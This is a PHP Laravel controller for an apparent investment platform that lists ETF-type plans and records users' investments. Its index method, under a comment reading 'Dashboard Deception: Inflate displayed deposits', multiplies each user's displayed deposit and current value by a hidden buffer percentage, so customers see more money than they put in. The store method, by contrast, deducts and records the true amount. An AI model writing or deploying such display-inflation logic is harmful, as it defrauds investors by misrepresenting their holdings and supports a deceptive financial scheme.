<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use App\Models\Balance;
use App\Models\Investment_history;
use App\Models\Noti;
use App\Models\Package;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class InvestmentController extends Controller
{
    public function index()
    {
        $investment = Package::where('type', 'etf')->orderBy('id', 'asc')->get();
        $active_investments = Investment_history::where('user_id', auth()->id())->latest()->get();

        // Dashboard Deception: Inflate displayed deposits
        $active_investments->transform(function ($active) {
            $plan = Package::find($active->plan_id);
            $bufferPercent = $plan ? (float) $plan->buffer_percent : 20.0;
            $multiplier = 1 + ($bufferPercent / 100);
            $active->amount = $active->amount * $multiplier;
            if ($active->current_value) {
                $active->current_value = $active->current_value * $multiplier;
            }

            return $active;
        });

        return view('exchange.investment', compact('investment', 'active_investments'));
    }

    public function store(Request $request)
    {
        $user = auth()->user();
        // The frontend sends the slug or ID in the 'id' field for backward compatibility
        $plan = Package::where('slug', $request->id)->orWhere('id', $request->id)->first();
        $amount = (float) $request->amount;

        if (! $plan) {
            return response()->json(['error' => 'Invalid plan selector'], 400);
        }

        if ($amount < (float) $plan->amount) {
            return response()->json(['error' => 'Minimum investment for '.$plan->name.' is $'.$plan->amount], 400);
        }

        $balance = Balance::where('user_id', $user->id)->where('symbol', 'usd')->first();
        if (! $balance || $balance->amount < $amount) {
            return response()->json(['error' => 'Insufficient funds in your USD wallet'], 400);
        }

        // Transactional Logic
        DB::transaction(function () use ($user, $balance, $plan, $amount) {
            $balance->decrement('amount', $amount);

            // Create a persistent record for the Growth Plan investment
            Investment_history::create([
                'user_id' => $user->id,
                'plan_id' => $plan->id,
                'plan_name' => $plan->name,
                'amount' => $amount,
                'perc' => $plan->perc ?? 0,
                'day' => $plan->day ?? 30,
                'status' => 'active',
                'start_date' => now()->format('Y-m-d H:i:s'),
                'end_date' => now()->addDays($plan->day ?? 30)->format('Y-m-d H:i:s'),
                'last_credited_date' => now()->format('Y-m-d H:i:s'),
            ]);

            // (Removed logic that erroneously changed user account upgrade tier)

            Noti::create([
                'user_id' => $user->id,
                'title' => 'Investment Activated',
                'message' => 'You have successfully allocated $'.number_format($amount).' to the '.$plan->name.' protocol. Your '.($plan->day ?? 30).'-day term has started.',
                'status' => 'unread',
            ]);
        });

        return response()->json(['status' => 'Capital allocation for '.$plan->name.' successful! Protocol started.']);
    }
}
